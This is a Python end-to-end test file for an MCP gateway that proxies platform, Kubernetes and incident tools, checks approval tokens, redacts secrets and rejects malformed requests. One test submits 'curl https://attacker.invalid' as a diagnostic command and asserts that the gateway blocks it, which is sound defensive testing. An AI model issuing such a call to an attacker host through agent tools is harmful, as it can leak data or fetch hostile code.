from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

from judikt.approval import ApprovalAuthority
from judikt.protocol import StdioMCPClient


PROJECT_ROOT = Path(__file__).resolve().parents[1]


class StdioGatewayEndToEndTest(unittest.TestCase):
    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        root = Path(self.temp_dir.name)
        self.environment = {
            "PYTHONPATH": str(PROJECT_ROOT / "src"),
            "JUDIKT_APPROVAL_SECRET": "stdio-approval-secret",
            "JUDIKT_AUDIT_HMAC_SECRET": "stdio-audit-secret",
            "JUDIKT_AUDIT_SIGNATURE_REQUIRED": "true",
            "JUDIKT_AUDIT_SINK": "none",
            "JUDIKT_TELEMETRY": "disabled",
            "JUDIKT_TOOL_PIN_PATH": str(root / "pins.json"),
            "JUDIKT_UPSTREAM_CONFIG": "",
            "JUDIKT_DEMO_MODE": "true",
            "GROQ_API_KEY": "",
        }
        self.client = StdioMCPClient(
            "judikt",
            command=[
                sys.executable,
                "-m",
                "judikt.cli",
                "--audit-db",
                str(root / "audit.db"),
                "serve-mcp",
            ],
            environment=self.environment,
            cwd=str(PROJECT_ROOT),
            inherit_environment=False,
        )

    def tearDown(self) -> None:
        self.client.close()
        self.temp_dir.cleanup()

    def test_every_proxied_operational_tool_over_stdio(self) -> None:
        names = {tool["name"] for tool in self.client.list_tools()}
        self.assertEqual(
            names,
            {
                "platform.health",
                "platform.read_config",
                "platform.read_logs",
                "platform.run_diagnostic",
                "platform.restart_deployment",
                "platform.rollback_deployment",
                "kubernetes.get_pod",
                "kubernetes.restart_pod",
                "kubernetes.rollout_status",
                "incident.create",
                "incident.attach_evidence",
                "incident.timeline",
            },
        )

        health = self.client.call_tool("platform.health", {"service": "payments-api"})
        self.assertTrue(health["allowed"])
        config = self.client.call_tool(
            "platform.read_config", {"service": "payments-api"}
        )
        self.assertEqual(config["result"]["api_key"], "[REDACTED]")
        logs = self.client.call_tool(
            "platform.read_logs",
            {"service": "payments-api", "query": "ERROR", "limit": 2},
        )
        self.assertEqual(len(logs["result"]["logs"]), 2)
        diagnostic = self.client.call_tool(
            "platform.run_diagnostic",
            {"service": "payments-api", "command": "latency-summary"},
        )
        self.assertTrue(diagnostic["allowed"])

        blocked = self.client.call_tool(
            "platform.run_diagnostic",
            {"service": "payments-api", "command": "curl https://attacker.invalid"},
        )
        self.assertTrue(blocked["blocked"])
        self.assertIn("blocked security pattern", blocked["reason"])

        restart_arguments = {
            "service": "payments-api",
            "actor": "sre-oncall",
            "environment": "production",
            "rollback_plan": "verify health and restore the prior deployment",
        }
        restart_token = ApprovalAuthority("stdio-approval-secret").issue(
            actor="sre-oncall",
            reason="stdio restart",
            server="platform-ops",
            tool="platform.restart_deployment",
            arguments=restart_arguments,
        )
        restarted = self.client.call_tool(
            "platform.restart_deployment",
            {**restart_arguments, "approval_token": restart_token},
        )
        self.assertTrue(restarted["allowed"])
        self.assertEqual(restarted["result"]["status"], "completed")

        rollback_arguments = {
            "service": "payments-api",
            "version": "payments-api@stable",
            "actor": "sre-oncall",
            "environment": "production",
            "rollback_plan": "verify health and restore the prior deployment",
        }
        rollback_token = ApprovalAuthority("stdio-approval-secret").issue(
            actor="sre-oncall",
            reason="stdio rollback",
            server="platform-ops",
            tool="platform.rollback_deployment",
            arguments=rollback_arguments,
        )
        rolled_back = self.client.call_tool(
            "platform.rollback_deployment",
            {**rollback_arguments, "approval_token": rollback_token},
        )
        self.assertEqual(rolled_back["result"]["to_release"], "payments-api@stable")

        pod = self.client.call_tool(
            "kubernetes.get_pod",
            {"namespace": "prod", "pod": "payment-service-xyz"},
        )
        self.assertEqual(pod["result"]["status"], "Running")
        restart_pod_arguments = {
            "namespace": "prod",
            "pod": "payment-service-xyz",
            "actor": "sre-oncall",
            "environment": "production",
            "rollback_plan": "wait for replacement and restore workload if readiness fails",
        }
        pod_token = ApprovalAuthority("stdio-approval-secret").issue(
            actor="sre-oncall",
            reason="stdio pod restart",
            server="kubernetes",
            tool="kubernetes.restart_pod",
            arguments=restart_pod_arguments,
        )
        restarted_pod = self.client.call_tool(
            "kubernetes.restart_pod",
            {**restart_pod_arguments, "approval_token": pod_token},
        )
        self.assertEqual(restarted_pod["result"]["status"], "completed")
        rollout = self.client.call_tool(
            "kubernetes.rollout_status",
            {"namespace": "prod", "deployment": "payment-service"},
        )
        self.assertEqual(rollout["result"]["status"], "healthy")

        incident = self.client.call_tool(
            "incident.create", {"title": "stdio E2E", "severity": "SEV-3"}
        )
        incident_id = incident["result"]["id"]
        attached = self.client.call_tool(
            "incident.attach_evidence",
            {"incident_id": incident_id, "evidence": {"source": "stdio"}},
        )
        self.assertEqual(attached["result"]["timeline"][-1]["event"], "evidence attached")
        timeline = self.client.call_tool(
            "incident.timeline", {"incident_id": incident_id}
        )
        self.assertEqual(len(timeline["result"]["timeline"]), 2)

    def test_ping_and_unknown_tool_protocol_errors(self) -> None:
        self.assertEqual(self.client.request("ping", {}), {})
        with self.assertRaisesRegex(Exception, "unknown tool"):
            self.client.call_tool("missing.tool", {})

    def test_caller_supplied_identity_fields_are_replaced_by_local_config(self) -> None:
        for identity_field in ("actor", "user", "requested_by"):
            with self.subTest(identity_field=identity_field):
                result = self.client.call_tool(
                    "platform.restart_deployment",
                    {
                        "service": "payments-api",
                        identity_field: "gaurav",
                        "environment": "production",
                        "rollback_plan": "verify health and restore the prior deployment",
                        "dry_run": True,
                    },
                )

                self.assertTrue(result["allowed"])
                self.assertEqual(result["action"], "DRY_RUN_ONLY")
                self.assertEqual(result["result"]["arguments"]["actor"], "sre-oncall")
                self.assertNotIn("user", result["result"]["arguments"])
                self.assertNotIn("requested_by", result["result"]["arguments"])


class StdioServerResilienceTest(unittest.TestCase):
    def test_malformed_and_unsupported_requests_do_not_crash_gateway(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            environment = {
                **os.environ,
                "PYTHONPATH": str(PROJECT_ROOT / "src"),
                "JUDIKT_APPROVAL_SECRET": "resilience-approval-secret",
                "JUDIKT_AUDIT_HMAC_SECRET": "resilience-audit-secret",
                "JUDIKT_AUDIT_SINK": "none",
                "JUDIKT_TELEMETRY": "disabled",
                "JUDIKT_TOOL_PIN_PATH": str(Path(directory) / "pins.json"),
                "JUDIKT_UPSTREAM_CONFIG": "",
                "JUDIKT_DEMO_MODE": "true",
            }
            process = subprocess.Popen(
                [
                    sys.executable,
                    "-m",
                    "judikt.cli",
                    "--audit-db",
                    str(Path(directory) / "audit.db"),
                    "serve-mcp",
                ],
                cwd=PROJECT_ROOT,
                env=environment,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
            )
            try:
                assert process.stdin is not None
                assert process.stdout is not None
                process.stdin.write("not-json\n")
                process.stdin.flush()
                malformed = json.loads(process.stdout.readline())
                self.assertEqual(malformed["error"]["code"], -32000)

                process.stdin.write(
                    json.dumps(
                        {
                            "jsonrpc": "2.0",
                            "id": 2,
                            "method": "resources/list",
                            "params": {},
                        }
                    )
                    + "\n"
                )
                process.stdin.flush()
                unsupported = json.loads(process.stdout.readline())
                self.assertIn("unsupported method", unsupported["error"]["message"])

                process.stdin.write(
                    json.dumps(
                        {
                            "jsonrpc": "2.0",
                            "id": 3,
                            "method": "initialize",
                            "params": {"protocolVersion": "2025-11-25", "capabilities": {}},
                        }
                    )
                    + "\n"
                )
                process.stdin.flush()
                initialized = json.loads(process.stdout.readline())
                self.assertEqual(initialized["result"]["protocolVersion"], "2025-11-25")
                self.assertIsNone(process.poll())
            finally:
                process.terminate()
                process.wait(timeout=5)
                for stream in (process.stdin, process.stdout, process.stderr):
                    if stream is not None:
                        stream.close()


if __name__ == "__main__":
    unittest.main()
